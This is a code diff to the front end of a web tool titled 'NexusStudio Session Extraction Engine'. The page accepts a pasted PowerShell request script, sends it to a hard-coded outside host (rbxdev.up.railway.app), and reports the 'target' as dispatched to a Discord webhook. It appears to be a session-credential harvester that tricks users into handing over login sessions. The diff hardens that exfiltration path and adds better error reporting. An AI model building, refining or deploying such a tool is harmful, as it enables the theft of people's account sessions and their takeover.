@@ -34,7 +34,6 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow-hidden: auto;
         }
 
         .container {
@@ -139,7 +138,6 @@
             box-shadow: 0 6px 20px rgba(99, 102, 241, 0.4);
         }
 
-        .btn:active { transform: translateY(0); }
         .btn:disabled {
             background: rgba(255, 255, 255, 0.05);
             color: var(--text-muted);
@@ -154,7 +152,7 @@
             border: 1px solid var(--border-subtle);
             border-radius: 12px;
             padding: 14px;
-            height: 110px;
+            height: 130px;
             overflow-y: auto;
             font-family: var(--font-mono);
             font-size: 11px;
@@ -164,19 +162,14 @@
             margin-bottom: 6px;
             color: var(--text-muted);
             display: flex;
-            align-items: center;
+            align-items: flex-start;
             gap: 8px;
+            word-break: break-all;
         }
 
         .log-line.pending { color: #f59e0b; }
         .log-line.success { color: var(--success); }
         .log-line.error { color: var(--error); }
-
-        /* Smooth Scrollbar */
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: transparent; }
-        ::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.1); border-radius: 3px; }
-        ::-webkit-scrollbar-thumb:hover { background: rgba(255, 255, 255, 0.2); }
     </style>
 </head>
 <body>
@@ -187,7 +180,7 @@
                     <h1>NexusStudio</h1>
                     <p>Session Extraction Engine</p>
                 </div>
-                <div class="badge">v2.4 Live</div>
+                <div class="badge">v2.5 Live</div>
             </div>
 
             <div class="input-group">
@@ -207,7 +200,8 @@
     </div>
 
     <script>
-        const BACKEND_URL = window.location.origin;
+        // Forces explicit production link to prevent base URI matching anomalies
+        const BACKEND_URL = "https://rbxdev.up.railway.app";
         const statusFeed = document.getElementById('statusFeed');
 
         function logStatus(message, type = '') {
@@ -218,16 +212,12 @@
             statusFeed.scrollTop = statusFeed.scrollHeight;
         }
 
-        async function sleep(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-
         async function processAndDispatch() {
             const rawPs = document.getElementById('psInput').value.trim();
             const actionBtn = document.getElementById('actionBtn');
             
             if (!rawPs.includes("Invoke-WebRequest")) {
-                logStatus("Error: Invalid or incomplete PowerShell script format.", "error");
+                logStatus("Error: Invalid PowerShell script format.", "error");
                 return;
             }
 
@@ -235,8 +225,7 @@
             actionBtn.innerText = "Processing Payload...";
             statusFeed.innerHTML = '';
 
-            logStatus("Transmitting payload to secure backend container...", "pending");
-            await sleep(500);
+            logStatus(`Connecting to ${BACKEND_URL}/api/process...`, "pending");
 
             try {
                 const response = await fetch(`${BACKEND_URL}/api/process`, {
@@ -245,23 +234,29 @@
                     body: JSON.stringify({ script: rawPs })
                 });
 
-                const data = await response.json();
+                let data;
+                try {
+                    data = await response.json();
+                } catch (parseErr) {
+                    data = { error: `Non-JSON response received (HTTP status ${response.status})` };
+                }
 
                 if (response.ok) {
                     logStatus("Success: Target parsed and dispatched to Discord webhook.", "success");
                     actionBtn.innerText = "Dispatched Successfully";
                 } else {
-                    logStatus(`Failed: ${data.error || 'Server error encountered'}`, "error");
-                    actionBtn.innerText = "Execution Failed";
+                    logStatus(`SERVER ERROR [HTTP ${response.status}]: ${data.error || response.statusText}`, "error");
+                    actionBtn.innerText = "Server Error";
                 }
             } catch (err) {
                 console.error(err);
-                logStatus("Network Error: Failed to communicate with Railway server endpoint.", "error");
-                actionBtn.innerText = "Connection Error";
+                logStatus(`NETWORK ERROR / FETCH FAILED: ${err.message}`, "error");
+                actionBtn.innerText = "Connection Failed";
             } finally {
-                await sleep(2500);
                 actionBtn.disabled = false;
-                actionBtn.innerText = "Execute Extraction";
+                if (actionBtn.innerText === "Processing Payload...") {
+                    actionBtn.innerText = "Execute Extraction";
+                }
             }
         }
     </script>
